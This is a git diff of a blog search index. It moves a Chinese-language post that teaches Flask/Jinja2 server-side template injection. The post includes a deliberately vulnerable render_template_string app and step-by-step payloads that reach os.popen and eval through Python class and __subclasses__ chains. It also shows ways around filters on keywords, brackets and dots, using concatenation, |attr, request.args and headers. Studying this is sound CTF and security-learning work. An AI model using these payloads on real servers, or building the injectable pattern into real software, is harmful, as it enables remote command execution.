@@ -1,6 +1,103 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>FlaskSSti</title>
+    <url>/2020/10/27/FlaskSSti/</url>
+    <content><![CDATA[<p>一直对ssti比较模糊，遇见的时候都是网上去照抄payload去打，自己没有什么主动构造payload的能力，这次遇见一道题决定总结一些该怎么做</p>
+<a id="more"></a>
+
+<h1 id="1-hackbar-自带的payload如何构成的"><a href="#1-hackbar-自带的payload如何构成的" class="headerlink" title="1.hackbar 自带的payload如何构成的"></a>1.hackbar 自带的payload如何构成的</h1><p>第一件事情，就是搭建我们的环境：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, render_template_string</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(&#x27;/&#x27;, methods=[&#x27;POST&#x27;, &#x27;GET&#x27;])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span>():</span></span><br><span class="line">    <span class="built_in">id</span> = request.args.get(<span class="string">&quot;id&quot;</span>)</span><br><span class="line">    html = <span class="string">&#x27;&#x27;&#x27;&lt;h1&gt;%s&lt;/h1&gt; &#x27;&#x27;&#x27;</span> % (<span class="built_in">id</span>)</span><br><span class="line">    <span class="keyword">return</span> render_template_string(html)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">80</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>这种就是最基本的flask，在flask当中jinjia的模板，我们使用两个花括号就可以允许一些基本的运算 用于执行if，for循环等等，那么我们一个最基本的payload的构造方式是该怎么触发呢？第一步，从config类触发，因为Flask里面自带</p>
+<figure class="highlight"><table><tr><td class="code"><pre><span class="line">http://localhost/?id=&#123;&#123; config.items() &#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="F:\MyGitBlog\themes\diaspora\source\img\image-20201026173228975.png" alt="image-20201026173228975"></p>
+<p>通过这个类我们可以得到所有的flask的config~，而这一的意义好像不是很大？我们得不到很多东西，但是我们可以用这个作为跳板，执行下一步</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">.__class__.__init__</span><br></pre></td></tr></table></figure>
+
+<p>__class方法属性的时候会只想该实例对应的类，此时config的类是Config,然后可以再去调用其它类属性，如果我们审计了源码，就可以知道我们此时的Config类位于config.py80多行，当我们执行__init__之后，便可以在下面的101行找到这么一行代码：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">rv = os.environ.get(variable_name)</span><br></pre></td></tr></table></figure>
+
+<p>也就是说，我们的config类当中含有os库的方法，如果我们直接使用是不行的，但我们可以通过globals函数先获取到它，于是得到：</p>
+<p><strong>globals()</strong> 函数会以字典类型返回当前位置的全部全局变量,在交互模式下：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">__globals__</span><br></pre></td></tr></table></figure>
+
+<p>于是我们拼接得到如下的payload:</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">config.__class__.__init__.__globals__</span><br></pre></td></tr></table></figure>
+
+<p>可以得到：</p>
+<p><img src="F:\MyGitBlog\themes\diaspora\source\img\image-20201026175828323.png" alt="image-20201026175828323"></p>
+<p>我们用下面这个方式来获取os库，利用__dict这个方法来查看os库哪些可以给我们进行使用</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">.__globals__[<span class="string">&#x27;os&#x27;</span>]</span><br></pre></td></tr></table></figure>
+
+<p>我们能够找到system，但是我们用该方法却无法得到回显，该方法只不过是成功的时候返回1，失败了则是返回0</p>
+<p>执行如下：</p>
+<figure class="highlight"><table><tr><td class="code"><pre><span class="line">http://localhost/</span><br><span class="line">?id=&#123;&#123;%20config.__class__.__init__.__globals__[&#x27;os&#x27;].system(&#x27;dir()&#x27;)&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>得到1或者0对于我们来说意义不大，当然这样也可以进行盲注【，而popen则可以返回文件对象</p>
+<p><strong>os.popen</strong> </p>
+<p>　　该方法不但执行命令还返回执行后的信息对象，是通过一个管道文件将结果返回。</p>
+<p>　　output = os.popen(‘cat /proc/cpuinfo’)</p>
+<p>　　print output.read()</p>
+<p>于是我们构造最终的payload：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;&#123;config.__class__.__init__.__globals__[<span class="string">&#x27;os&#x27;</span>].popen(<span class="string">&#x27;dir()&#x27;</span>).read()&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="1-2-config以外的思路"><a href="#1-2-config以外的思路" class="headerlink" title="1.2 config以外的思路"></a>1.2 config以外的思路</h2><p>其他的一些思路，首先，我们的config被过滤了，我们该怎么办呢？除此之外，我们还可以通过()和’’分别获取到tuple和str的初始化~</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;</span>.__class__.__name__  <span class="comment">#得到str</span></span><br><span class="line">()_.__class__.__name__ <span class="comment">#tuple</span></span><br></pre></td></tr></table></figure>
+
+<p>这时引入base和mro的魔术方法</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">__bases__ : 类的基类的元组，顺序为它们在基类列表中出现的顺序（基类就是Object类~）</span><br><span class="line"></span><br><span class="line">__mro__ :类的父类，从父类网上找，最终会找到基类，所以mro[<span class="number">-1</span>]等价于__bases__</span><br></pre></td></tr></table></figure>
+
+<p><img src="F:\MyGitBlog\themes\diaspora\source\img\image-20201026184448939.png" alt="image-20201026184448939"></p>
+<p>这时候我们就想到的，我们既然得到了基类，是不是就想要所有的子类了呢？毕竟子类的内容我们更加感兴趣，我们最终的目标就是找到os库对吧。而python正好拥有这个魔术方法</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">__subclasses__ <span class="comment">#获取所有的子类方法</span></span><br></pre></td></tr></table></figure>
+
+<p>之后慢慢去寻找即可，该文章中有，在catch_warnnings模块下含有__builtins__，我们可以用这个去找eval：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&#123; [].__class__.__mro__[-1].__subclasses__()[192].__init__.__globals__. __builtins__[&#39;eval&#39;](&quot;__import__(&#39;os&#39;).popen(&#39;dir()&#39;).read()&quot;)    &#125;&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h2 id="1-3总结做题的思路："><a href="#1-3总结做题的思路：" class="headerlink" title="1.3总结做题的思路："></a>1.3总结做题的思路：</h2><p>总而言之，我们要么去找builtins函数下的eval，要么去找os。</p>
+<h1 id="2-谈谈过滤"><a href="#2-谈谈过滤" class="headerlink" title="2.谈谈过滤"></a>2.谈谈过滤</h1><p>在某些情况下，会遇见各种各样的过滤，比如我们遇见对config的过滤，以及os过滤啊等等</p>
+<h2 id="2-1-过滤了os，system等的情况"><a href="#2-1-过滤了os，system等的情况" class="headerlink" title="2.1 过滤了os，system等的情况"></a>2.1 过滤了os，system等的情况</h2><p>在这种情况下我们也不需慌，如果只是对中括号中可能用到的内容进行过滤的话，我们完全可以通过拼接绕过：</p>
+<p>比如我们之前的payload修改成：</p>
+<figure class="highlight"><table><tr><td class="code"><pre><span class="line">?id=&#123;&#123; config.__init__.__globals__[&#x27;o&#x27;+&#x27;s&#x27;].popen(&#x27;dir&#x27;).read() &#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="2-2-过滤了中括号"><a href="#2-2-过滤了中括号" class="headerlink" title="2.2 过滤了中括号"></a>2.2 过滤了中括号</h2><p>这样的话,可以用getitem方法，该方法等价于一个迭代器的选择，开发者的原意是让人们可以用这个迭代对象,这篇文章讲的不错</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;blog.csdn.net&#x2F;qq_24805141&#x2F;article&#x2F;details&#x2F;81411775</span><br></pre></td></tr></table></figure>
+
+<p>Python的魔法方法<code>__getitem__</code> 可以让对象实现迭代功能，这样就可以使用<code>for...in...</code> 来迭代该对象了，同时也允许我们利用gettiem来直接选择内容,所以我们之前的payload：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;&#123; config.__init__.__globals__.__getitem__(<span class="string">&#x27;os&#x27;</span>).popen(<span class="string">&#x27;dir()&#x27;</span>).read() &#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>利用request起步</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;&#123; request.__class__.__mro__.__getitem__(<span class="number">-1</span>).__subclasses__().__getitem__(<span class="number">192</span>).__init__.__globals__.__builtins__.__getitem__(<span class="string">&#x27;eval&#x27;</span>)(<span class="string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;dir()&#x27;).read()&quot;</span>) &#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="2-3-过滤了-号"><a href="#2-3-过滤了-号" class="headerlink" title="2.3 过滤了.号"></a>2.3 过滤了.号</h2><p>这个可以使用attr来进行绕过了，直接给出绕过方法：</p>
+<p>所以之前的payload进行对比：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">[].__class__ = []|attr(__class__)</span><br><span class="line">&#123;&#123;[]|attr(<span class="string">&#x27;__class__&#x27;</span>)|attr(<span class="string">&#x27;__base__&#x27;</span>)|attr(<span class="string">&#x27;__subclasses__&#x27;</span>)()  &#125;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&#123;   ([]|attr(<span class="string">&#x27;__class__&#x27;</span>)|attr(<span class="string">&#x27;__base__&#x27;</span>)|attr(<span class="string">&#x27;__subclasses__&#x27;</span>)())[<span class="number">190</span>]  &#125;&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;&#123;   ([]|attr(<span class="string">&#x27;__class__&#x27;</span>)|attr(<span class="string">&#x27;__base__&#x27;</span>)|attr(<span class="string">&#x27;__subclasses__&#x27;</span>)())[<span class="number">192</span>]|attr(<span class="string">&#x27;__init__&#x27;</span>)|attr(<span class="string">&#x27;__globals__&#x27;</span>)|attr(<span class="string">&#x27;__builtins__&#x27;</span>)|attr(__getitem__)(<span class="string">&#x27;eval&#x27;</span>)  &#125;&#125;</span><br><span class="line">    <span class="comment"># 拼到这里拼不下去了。。请问有人知道为什么嘛,eval无论如何都取不到了</span></span><br></pre></td></tr></table></figure>
+
+<p>不知道为什么在我从上往下继续取值的时候，怎么都没法继续向下取值了。但是看见可以转换思路</p>
+<h2 id="2-5利用request"><a href="#2-5利用request" class="headerlink" title="2.5利用request"></a>2.5利用request</h2><p>​    因为flask此时能允许用户自定义输出，十有八九是有request的，所以我们去利用这个也不是相当不错的</p>
+<p>这里翻阅到了一个老外思路，但是他没给全。</p>
+<figure class="highlight"><table><tr><td class="code"><pre><span class="line">http://localhost/?id=&#123;&#123;request|attr([request.args.usc*2,request.args.class,request.args.usc*2]|join)|attr(&#x27;__base__&#x27;)      &#125;&#125;&amp;class=class&amp;usc=_&amp;init=init</span><br></pre></td></tr></table></figure>
+
+<p>利用request的思路去重新把payload拼出来</p>
+<figure class="highlight"><table><tr><td class="code"><pre><span class="line">?id=&#123;&#123;[][request[&#x27;args&#x27;][&#x27;class&#x27;]][request[&#x27;args&#x27;][&#x27;base&#x27;]][request[&#x27;args&#x27;][&#x27;subclasses&#x27;]]()[153][request[&#x27;args&#x27;][&#x27;dict&#x27;]][request[&#x27;args&#x27;][&#x27;init&#x27;]][request[&#x27;args&#x27;][&#x27;globals&#x27;]][request[&#x27;args&#x27;][&#x27;builtins&#x27;]][&#x27;eval&#x27;](request[&#x27;args&#x27;][&#x27;payload&#x27;])&#125;&#125;&amp;base=__base__&amp;subclasses=__subclasses__&amp;dict=__dict__&amp;init=__init__&amp;globals=__globals__&amp;builtins=__builtins__&amp;class=__class__&amp;payload=__import__(&#x27;os&#x27;).popen(&#x27;dir()&#x27;).read()</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="2-4将中括号和-号都过滤情况下"><a href="#2-4将中括号和-号都过滤情况下" class="headerlink" title="2.4将中括号和.号都过滤情况下"></a>2.4将中括号和.号都过滤情况下</h2><p>当然上面的难度都是相当简单的题目才会遇见了，在当前环境下，往往会过滤的相当严格，我们应该从flask本身出现的类开始找，比如题目可能验证的时候，仅仅验证我们输入的id。但是我们可以利用此，让flask读取header中的内容，这样就可以打破限制</p>
+<p>我们可以先写一个脚本：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">http://localhost/</span><br><span class="line">?id=&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;</span><br><span class="line">&#123;% <span class="keyword">if</span> c.__name__ == <span class="string">&#x27;catch_warnings&#x27;</span> %&#125;</span><br><span class="line">  &#123;% <span class="keyword">for</span> b <span class="keyword">in</span> c.__init__.__globals__.values() %&#125;</span><br><span class="line">  &#123;% <span class="keyword">if</span> b.__class__ == &#123;&#125;.__class__ %&#125;</span><br><span class="line">    &#123;% <span class="keyword">if</span> <span class="string">&#x27;eval&#x27;</span> <span class="keyword">in</span> b.keys() %&#125;</span><br><span class="line">      &#123;&#123; b[<span class="string">&#x27;eval&#x27;</span>](<span class="string">&#x27;__import__(&quot;os&quot;).popen(&quot;dir()&quot;).read()&#x27;</span>) &#125;&#125;       </span><br><span class="line">    &#123;% endif %&#125;</span><br><span class="line">  &#123;% endif %&#125;</span><br><span class="line">  &#123;% endfor %&#125;</span><br><span class="line">&#123;% endif %&#125;</span><br><span class="line">&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure>
+
+<p>之后为了绕过括号的限制，采用这种方法：</p>
+<p>这里给出一个payload：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;% <span class="keyword">for</span> c <span class="keyword">in</span> []|attr(request.headers.x1)|attr(request.headers.x2)|attr(request.headers.x3)() %&#125;</span><br><span class="line">    &#123;% <span class="keyword">if</span> c|attr(request.headers.x4)==request.headers.x5 %&#125;</span><br><span class="line">    &#123;%<span class="keyword">for</span> d <span class="keyword">in</span> ((c|attr(request.headers.x6)|attr(request.headers.x7))[request.headers.x8])%&#125;</span><br><span class="line">        &#123;%<span class="keyword">if</span> d==request.headers.x9%&#125;&#123;&#123;((c|attr(request.headers.x6)|attr(request.headers.x7))[request.headers.x8])[d](request.headers.x13)&#125;&#125;</span><br><span class="line">        &#123;% endif %&#125;</span><br><span class="line">    &#123;% endfor %&#125;</span><br><span class="line">    &#123;% endif%&#125;</span><br><span class="line">&#123;% endfor %&#125; </span><br><span class="line"></span><br><span class="line">x13: <span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).popen(<span class="string">&#x27;ls&#x27;</span>).read()</span><br><span class="line">x9: <span class="built_in">eval</span></span><br><span class="line">x8: __builtins__</span><br><span class="line">x7: __globals__</span><br><span class="line">x6: __init__</span><br><span class="line">x5: catch_warnings</span><br><span class="line">x4: __name__</span><br><span class="line">x3: __subclasses__</span><br><span class="line">x2: __base__</span><br><span class="line">x1: __class__</span><br></pre></td></tr></table></figure>
+
+]]></content>
+  </entry>
+  <entry>
     <title>Vue总结</title>
     <url>/2020/10/25/Vue%E6%80%BB%E7%BB%93/</url>
     <content><![CDATA[<h1 id="Vue-part"><a href="#Vue-part" class="headerlink" title="Vue part"></a>Vue part</h1><p>总结了前端项目的搭建，以及自己在这次作品中学到了什么</p>
@@ -111,103 +208,6 @@
       <tags>
         <tag>BUU</tag>
       </tags>
-  </entry>
-  <entry>
-    <title>FlaskSSti</title>
-    <url>/2020/10/27/FlaskSSti/</url>
-    <content><![CDATA[<p>一直对ssti比较模糊，遇见的时候都是网上去照抄payload去打，自己没有什么主动构造payload的能力，这次遇见一道题决定总结一些该怎么做</p>
-<a id="more"></a>
-
-<h1 id="1-hackbar-自带的payload如何构成的"><a href="#1-hackbar-自带的payload如何构成的" class="headerlink" title="1.hackbar 自带的payload如何构成的"></a>1.hackbar 自带的payload如何构成的</h1><p>第一件事情，就是搭建我们的环境：</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, render_template_string</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(&#x27;/&#x27;, methods=[&#x27;POST&#x27;, &#x27;GET&#x27;])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span>():</span></span><br><span class="line">    <span class="built_in">id</span> = request.args.get(<span class="string">&quot;id&quot;</span>)</span><br><span class="line">    html = <span class="string">&#x27;&#x27;&#x27;&lt;h1&gt;%s&lt;/h1&gt; &#x27;&#x27;&#x27;</span> % (<span class="built_in">id</span>)</span><br><span class="line">    <span class="keyword">return</span> render_template_string(html)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">80</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p>这种就是最基本的flask，在flask当中jinjia的模板，我们使用两个花括号就可以允许一些基本的运算 用于执行if，for循环等等，那么我们一个最基本的payload的构造方式是该怎么触发呢？第一步，从config类触发，因为Flask里面自带</p>
-<figure class="highlight"><table><tr><td class="code"><pre><span class="line">http://localhost/?id=&#123;&#123; config.items() &#125;&#125;</span><br></pre></td></tr></table></figure>
-
-<p><img src="F:\MyGitBlog\themes\diaspora\source\img\image-20201026173228975.png" alt="image-20201026173228975"></p>
-<p>通过这个类我们可以得到所有的flask的config~，而这一的意义好像不是很大？我们得不到很多东西，但是我们可以用这个作为跳板，执行下一步</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">.__class__.__init__</span><br></pre></td></tr></table></figure>
-
-<p>__class方法属性的时候会只想该实例对应的类，此时config的类是Config,然后可以再去调用其它类属性，如果我们审计了源码，就可以知道我们此时的Config类位于config.py80多行，当我们执行__init__之后，便可以在下面的101行找到这么一行代码：</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">rv = os.environ.get(variable_name)</span><br></pre></td></tr></table></figure>
-
-<p>也就是说，我们的config类当中含有os库的方法，如果我们直接使用是不行的，但我们可以通过globals函数先获取到它，于是得到：</p>
-<p><strong>globals()</strong> 函数会以字典类型返回当前位置的全部全局变量,在交互模式下：</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">__globals__</span><br></pre></td></tr></table></figure>
-
-<p>于是我们拼接得到如下的payload:</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">config.__class__.__init__.__globals__</span><br></pre></td></tr></table></figure>
-
-<p>可以得到：</p>
-<p><img src="F:\MyGitBlog\themes\diaspora\source\img\image-20201026175828323.png" alt="image-20201026175828323"></p>
-<p>我们用下面这个方式来获取os库，利用__dict这个方法来查看os库哪些可以给我们进行使用</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">.__globals__[<span class="string">&#x27;os&#x27;</span>]</span><br></pre></td></tr></table></figure>
-
-<p>我们能够找到system，但是我们用该方法却无法得到回显，该方法只不过是成功的时候返回1，失败了则是返回0</p>
-<p>执行如下：</p>
-<figure class="highlight"><table><tr><td class="code"><pre><span class="line">http://localhost/</span><br><span class="line">?id=&#123;&#123;%20config.__class__.__init__.__globals__[&#x27;os&#x27;].system(&#x27;dir()&#x27;)&#125;&#125;</span><br></pre></td></tr></table></figure>
-
-<p>得到1或者0对于我们来说意义不大，当然这样也可以进行盲注【，而popen则可以返回文件对象</p>
-<p><strong>os.popen</strong> </p>
-<p>　　该方法不但执行命令还返回执行后的信息对象，是通过一个管道文件将结果返回。</p>
-<p>　　output = os.popen(‘cat /proc/cpuinfo’)</p>
-<p>　　print output.read()</p>
-<p>于是我们构造最终的payload：</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;&#123;config.__class__.__init__.__globals__[<span class="string">&#x27;os&#x27;</span>].popen(<span class="string">&#x27;dir()&#x27;</span>).read()&#125;&#125;</span><br></pre></td></tr></table></figure>
-
-<h2 id="1-2-config以外的思路"><a href="#1-2-config以外的思路" class="headerlink" title="1.2 config以外的思路"></a>1.2 config以外的思路</h2><p>其他的一些思路，首先，我们的config被过滤了，我们该怎么办呢？除此之外，我们还可以通过()和’’分别获取到tuple和str的初始化~</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;</span>.__class__.__name__  <span class="comment">#得到str</span></span><br><span class="line">()_.__class__.__name__ <span class="comment">#tuple</span></span><br></pre></td></tr></table></figure>
-
-<p>这时引入base和mro的魔术方法</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">__bases__ : 类的基类的元组，顺序为它们在基类列表中出现的顺序（基类就是Object类~）</span><br><span class="line"></span><br><span class="line">__mro__ :类的父类，从父类网上找，最终会找到基类，所以mro[<span class="number">-1</span>]等价于__bases__</span><br></pre></td></tr></table></figure>
-
-<p><img src="F:\MyGitBlog\themes\diaspora\source\img\image-20201026184448939.png" alt="image-20201026184448939"></p>
-<p>这时候我们就想到的，我们既然得到了基类，是不是就想要所有的子类了呢？毕竟子类的内容我们更加感兴趣，我们最终的目标就是找到os库对吧。而python正好拥有这个魔术方法</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">__subclasses__ <span class="comment">#获取所有的子类方法</span></span><br></pre></td></tr></table></figure>
-
-<p>之后慢慢去寻找即可，该文章中有，在catch_warnnings模块下含有__builtins__，我们可以用这个去找eval：</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&#123; [].__class__.__mro__[-1].__subclasses__()[192].__init__.__globals__. __builtins__[&#39;eval&#39;](&quot;__import__(&#39;os&#39;).popen(&#39;dir()&#39;).read()&quot;)    &#125;&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<h2 id="1-3总结做题的思路："><a href="#1-3总结做题的思路：" class="headerlink" title="1.3总结做题的思路："></a>1.3总结做题的思路：</h2><p>总而言之，我们要么去找builtins函数下的eval，要么去找os。</p>
-<h1 id="2-谈谈过滤"><a href="#2-谈谈过滤" class="headerlink" title="2.谈谈过滤"></a>2.谈谈过滤</h1><p>在某些情况下，会遇见各种各样的过滤，比如我们遇见对config的过滤，以及os过滤啊等等</p>
-<h2 id="2-1-过滤了os，system等的情况"><a href="#2-1-过滤了os，system等的情况" class="headerlink" title="2.1 过滤了os，system等的情况"></a>2.1 过滤了os，system等的情况</h2><p>在这种情况下我们也不需慌，如果只是对中括号中可能用到的内容进行过滤的话，我们完全可以通过拼接绕过：</p>
-<p>比如我们之前的payload修改成：</p>
-<figure class="highlight"><table><tr><td class="code"><pre><span class="line">?id=&#123;&#123; config.__init__.__globals__[&#x27;o&#x27;+&#x27;s&#x27;].popen(&#x27;dir&#x27;).read() &#125;&#125;</span><br></pre></td></tr></table></figure>
-
-<h2 id="2-2-过滤了中括号"><a href="#2-2-过滤了中括号" class="headerlink" title="2.2 过滤了中括号"></a>2.2 过滤了中括号</h2><p>这样的话,可以用getitem方法，该方法等价于一个迭代器的选择，开发者的原意是让人们可以用这个迭代对象,这篇文章讲的不错</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;blog.csdn.net&#x2F;qq_24805141&#x2F;article&#x2F;details&#x2F;81411775</span><br></pre></td></tr></table></figure>
-
-<p>Python的魔法方法<code>__getitem__</code> 可以让对象实现迭代功能，这样就可以使用<code>for...in...</code> 来迭代该对象了，同时也允许我们利用gettiem来直接选择内容,所以我们之前的payload：</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;&#123; config.__init__.__globals__.__getitem__(<span class="string">&#x27;os&#x27;</span>).popen(<span class="string">&#x27;dir()&#x27;</span>).read() &#125;&#125;</span><br></pre></td></tr></table></figure>
-
-<p>利用request起步</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;&#123; request.__class__.__mro__.__getitem__(<span class="number">-1</span>).__subclasses__().__getitem__(<span class="number">192</span>).__init__.__globals__.__builtins__.__getitem__(<span class="string">&#x27;eval&#x27;</span>)(<span class="string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;dir()&#x27;).read()&quot;</span>) &#125;&#125;</span><br></pre></td></tr></table></figure>
-
-<h2 id="2-3-过滤了-号"><a href="#2-3-过滤了-号" class="headerlink" title="2.3 过滤了.号"></a>2.3 过滤了.号</h2><p>这个可以使用attr来进行绕过了，直接给出绕过方法：</p>
-<p>所以之前的payload进行对比：</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">[].__class__ = []|attr(__class__)</span><br><span class="line">&#123;&#123;[]|attr(<span class="string">&#x27;__class__&#x27;</span>)|attr(<span class="string">&#x27;__base__&#x27;</span>)|attr(<span class="string">&#x27;__subclasses__&#x27;</span>)()  &#125;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&#123;   ([]|attr(<span class="string">&#x27;__class__&#x27;</span>)|attr(<span class="string">&#x27;__base__&#x27;</span>)|attr(<span class="string">&#x27;__subclasses__&#x27;</span>)())[<span class="number">190</span>]  &#125;&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;&#123;   ([]|attr(<span class="string">&#x27;__class__&#x27;</span>)|attr(<span class="string">&#x27;__base__&#x27;</span>)|attr(<span class="string">&#x27;__subclasses__&#x27;</span>)())[<span class="number">192</span>]|attr(<span class="string">&#x27;__init__&#x27;</span>)|attr(<span class="string">&#x27;__globals__&#x27;</span>)|attr(<span class="string">&#x27;__builtins__&#x27;</span>)|attr(__getitem__)(<span class="string">&#x27;eval&#x27;</span>)  &#125;&#125;</span><br><span class="line">    <span class="comment"># 拼到这里拼不下去了。。请问有人知道为什么嘛,eval无论如何都取不到了</span></span><br></pre></td></tr></table></figure>
-
-<p>不知道为什么在我从上往下继续取值的时候，怎么都没法继续向下取值了。但是看见可以转换思路</p>
-<h2 id="2-5利用request"><a href="#2-5利用request" class="headerlink" title="2.5利用request"></a>2.5利用request</h2><p>​    因为flask此时能允许用户自定义输出，十有八九是有request的，所以我们去利用这个也不是相当不错的</p>
-<p>这里翻阅到了一个老外思路，但是他没给全。</p>
-<figure class="highlight"><table><tr><td class="code"><pre><span class="line">http://localhost/?id=&#123;&#123;request|attr([request.args.usc*2,request.args.class,request.args.usc*2]|join)|attr(&#x27;__base__&#x27;)      &#125;&#125;&amp;class=class&amp;usc=_&amp;init=init</span><br></pre></td></tr></table></figure>
-
-<p>利用request的思路去重新把payload拼出来</p>
-<figure class="highlight"><table><tr><td class="code"><pre><span class="line">?id=&#123;&#123;[][request[&#x27;args&#x27;][&#x27;class&#x27;]][request[&#x27;args&#x27;][&#x27;base&#x27;]][request[&#x27;args&#x27;][&#x27;subclasses&#x27;]]()[153][request[&#x27;args&#x27;][&#x27;dict&#x27;]][request[&#x27;args&#x27;][&#x27;init&#x27;]][request[&#x27;args&#x27;][&#x27;globals&#x27;]][request[&#x27;args&#x27;][&#x27;builtins&#x27;]][&#x27;eval&#x27;](request[&#x27;args&#x27;][&#x27;payload&#x27;])&#125;&#125;&amp;base=__base__&amp;subclasses=__subclasses__&amp;dict=__dict__&amp;init=__init__&amp;globals=__globals__&amp;builtins=__builtins__&amp;class=__class__&amp;payload=__import__(&#x27;os&#x27;).popen(&#x27;dir()&#x27;).read()</span><br></pre></td></tr></table></figure>
-
-
-
-<h2 id="2-4将中括号和-号都过滤情况下"><a href="#2-4将中括号和-号都过滤情况下" class="headerlink" title="2.4将中括号和.号都过滤情况下"></a>2.4将中括号和.号都过滤情况下</h2><p>当然上面的难度都是相当简单的题目才会遇见了，在当前环境下，往往会过滤的相当严格，我们应该从flask本身出现的类开始找，比如题目可能验证的时候，仅仅验证我们输入的id。但是我们可以利用此，让flask读取header中的内容，这样就可以打破限制</p>
-<p>我们可以先写一个脚本：</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">http://localhost/</span><br><span class="line">?id=&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;</span><br><span class="line">&#123;% <span class="keyword">if</span> c.__name__ == <span class="string">&#x27;catch_warnings&#x27;</span> %&#125;</span><br><span class="line">  &#123;% <span class="keyword">for</span> b <span class="keyword">in</span> c.__init__.__globals__.values() %&#125;</span><br><span class="line">  &#123;% <span class="keyword">if</span> b.__class__ == &#123;&#125;.__class__ %&#125;</span><br><span class="line">    &#123;% <span class="keyword">if</span> <span class="string">&#x27;eval&#x27;</span> <span class="keyword">in</span> b.keys() %&#125;</span><br><span class="line">      &#123;&#123; b[<span class="string">&#x27;eval&#x27;</span>](<span class="string">&#x27;__import__(&quot;os&quot;).popen(&quot;dir()&quot;).read()&#x27;</span>) &#125;&#125;       </span><br><span class="line">    &#123;% endif %&#125;</span><br><span class="line">  &#123;% endif %&#125;</span><br><span class="line">  &#123;% endfor %&#125;</span><br><span class="line">&#123;% endif %&#125;</span><br><span class="line">&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure>
-
-<p>之后为了绕过括号的限制，采用这种方法：</p>
-<p>这里给出一个payload：</p>
